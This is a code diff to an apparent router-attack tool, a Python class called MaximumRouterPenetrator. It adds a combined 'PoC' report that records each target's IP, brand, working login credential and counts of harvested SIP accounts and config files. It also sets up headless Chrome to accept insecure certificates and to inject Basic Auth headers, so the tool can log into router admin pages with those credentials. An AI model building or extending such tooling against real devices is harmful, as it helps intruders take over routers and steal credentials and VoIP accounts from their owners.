@@ -2020,12 +2020,52 @@ class MaximumRouterPenetrator:
             with open(filename, 'w', encoding='utf-8') as f:
                 f.write(html_content)
             
+            # Append to combined report as well
+            try:
+                self._append_to_combined_html_report(target_ip, result, router_info)
+            except Exception:
+                pass
+            
             return {'success': True, 'filename': filename}
             
         except Exception as e:
             if verbose:
                 print(f"         ❌ HTML report generation error: {str(e)[:50]}")
             return {'success': False, 'error': str(e)}
+
+    def _append_to_combined_html_report(self, target_ip: str, result: dict, router_info: dict) -> None:
+        """Append this target's results to a single combined HTML report file."""
+        from datetime import datetime
+        import os
+        combined_name = "poc_report_combined.html"
+        working_credential = result.get('successful_credential', result.get('working_credential', 'unknown'))
+        sip_accounts = result.get('sip_accounts', [])
+        config_files = result.get('config_files_found', [])
+        section_html = f"""
+        <div class=\"section\">
+            <h2>Target {target_ip}</h2>
+            <p><strong>Brand:</strong> {router_info.get('brand','UNKNOWN')}</p>
+            <p><strong>Working Credential:</strong> <code>{working_credential}</code></p>
+            <p><strong>SIP Accounts:</strong> {len(sip_accounts)}</p>
+            <p><strong>Config Files:</strong> {len(config_files)}</p>
+        </div>
+        """
+        if not os.path.exists(combined_name):
+            header = f"""
+<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Combined Router Penetration PoC</title>
+<style>body{{font-family:Segoe UI,Arial,sans-serif;background:#f5f5f5;margin:0}}.container{{max-width:1200px;margin:0 auto;background:#fff;padding:20px}}.section{{margin:20px 0;padding:15px;border:1px solid #e0e0e0;border-radius:8px}}.header{{background:#444;color:#fff;padding:20px}}</style>
+</head><body><div class=\"header\"><h1>Combined PoC Report</h1><p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p></div><div class=\"container\">"""
+            with open(combined_name, 'w', encoding='utf-8') as f:
+                f.write(header)
+        with open(combined_name, 'a', encoding='utf-8') as f:
+            f.write(section_html)
+
+    def _finalize_combined_html_report(self) -> None:
+        import os
+        combined_name = "poc_report_combined.html"
+        if os.path.exists(combined_name):
+            with open(combined_name, 'a', encoding='utf-8') as f:
+                f.write("</div></body></html>")
     
     def _verify_target_reachable(self, ip: str) -> bool:
         """Verify target is reachable"""
@@ -4725,10 +4765,30 @@ class MaximumRouterPenetrator:
             chrome_options.add_argument('--disable-images')
             chrome_options.add_argument('--disable-javascript')
             chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+            try:
+                chrome_options.set_capability('acceptInsecureCerts', True)
+            except Exception:
+                pass
             
             # Create WebDriver
             driver = webdriver.Chrome(options=chrome_options)
             driver.set_page_load_timeout(self.selenium_config['timeout'])
+            
+            # Seed Basic Auth via CDP headers if credentials provided
+            try:
+                if credentials and len(credentials) == 2:
+                    import base64 as _b64
+                    userpass = f"{credentials[0]}:{credentials[1]}".encode('ascii')
+                    auth = _b64.b64encode(userpass).decode('ascii')
+                    driver.execute_cdp_cmd('Network.enable', {})
+                    driver.execute_cdp_cmd('Network.setExtraHTTPHeaders', {
+                        'headers': {
+                            'Authorization': f'Basic {auth}',
+                            'Upgrade-Insecure-Requests': '1'
+                        }
+                    })
+            except Exception:
+                pass
             
             try:
                 # Navigate to URL with authentication
